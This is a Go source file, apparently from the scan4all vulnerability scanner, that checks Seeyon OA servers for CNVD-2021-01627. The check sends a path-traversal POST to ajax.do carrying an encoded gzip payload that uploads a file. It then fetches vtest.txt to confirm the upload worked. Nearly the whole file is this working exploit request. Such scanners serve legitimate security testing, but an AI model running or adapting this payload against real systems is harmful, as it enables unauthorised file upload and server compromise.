package seeyon

import (
	"github.com/GhostTroops/scan4all/lib/util"
)

//ajax.do登录绕过&任意文件上传

func CNVD_2021_01627(u string) bool {
	data := "managerMethod=validate&arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uQ%3BO%C3%830%10%C2%9E%C3%A1W%C2%9C%C2%B28%15%C3%85%11%0F%21D%C3%95%C2%81%C2%8A2%22%C2%A0E%0C%C2%88%C3%81%24%17j%C3%A4%C3%98%C2%96%C3%AD%C2%B4%C2%A9%C2%A2%C3%BEw%C3%AC%3A%C2%90H%14%2F%C3%B7%C3%B0%7D%0F%C3%BB%C3%9EZR*S%C3%95%C2%82-%C2%B7%1A%C3%89%0D%C2%9C%C2%8D%C3%A1%C2%A7%C3%B3%C3%80%C2%AA%C3%90%21%0E%C2%AD%23%7D%7B%C3%9Eh%C2%83%C3%96r%25%C3%83%C3%A5%C3%82%19.%3FA3%C2%B7%C2%82%29%24%C2%94f%1B%C3%BC%60Z%C3%9B%C3%8C%22n%C2%95%C3%8C%C2%92%C3%891%C3%84s%C3%B4%C3%85%C3%96%C2%8CrE%1F%3D%C3%84%C2%BD%1A%C3%AE%C3%90%C2%80%C3%AE%C3%B3sO+q%03%07%C3%86%C3%92%C3%80%7F%C2%92%C2%AC%C2%83%15%C3%AA%1A%C2%97%C2%8C%7EY%C2%A1s%60W%28D%C2%B0P%C3%88g%C2%91_%3CM%7Ba%C2%B0%C2%B5%C2%A4%15%C2%B79%C2%9D%C3%9D.%C3%A6W%C2%97w%C2%98%C2%AB%C3%82k%17%5D%C2%8C%C2%B2%C2%87%C2%87%C3%92%C2%BFJ%11%C3%96%15%11%1B%C2%8B%C2%B4%23%C2%A41%C3%8E%C3%AA%C2%B2%C3%B4%04%7Bc%C2%A3q%C3%B2%C2%B2%C2%BC%3F%C2%BD%1E%1A%1F%3E%C2%9D%C3%AE%0B%21%C3%93%21%C3%B9%7F%C2%B3%C2%B9P%16%C2%BD%C2%B1%C3%9D%24%C3%BC%C2%87O%0A%2C%C3%81%3A%C3%A6x%0EM%C3%93%C2%A4%C2%A3%C2%96%C3%AC%C3%BC%C2%BE%C3%BC%C3%8E%C3%9A%10%C2%9D%C2%A9%C2%91%C2%BC%7F%03%10%C2%A2%C2%B5%C2%97%C3%AA%01%00%00"
	if req, err := util.HttpRequset(u+"/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip", "POST", data, false, nil); err == nil {
		if req.StatusCode == 500 {
			if req2, err := util.HttpRequset(u+"/seeyon/vtest.txt", "GET", "", false, nil); err == nil {
				if req2.StatusCode == 200 && util.StrContains(req2.Body, "vtest") {
					util.SendLog(req.RequestUrl, "CNVD-2021-01627", "Found vuln seeyon", "")
					return true
				}
			}
		}
	}
	return false
}
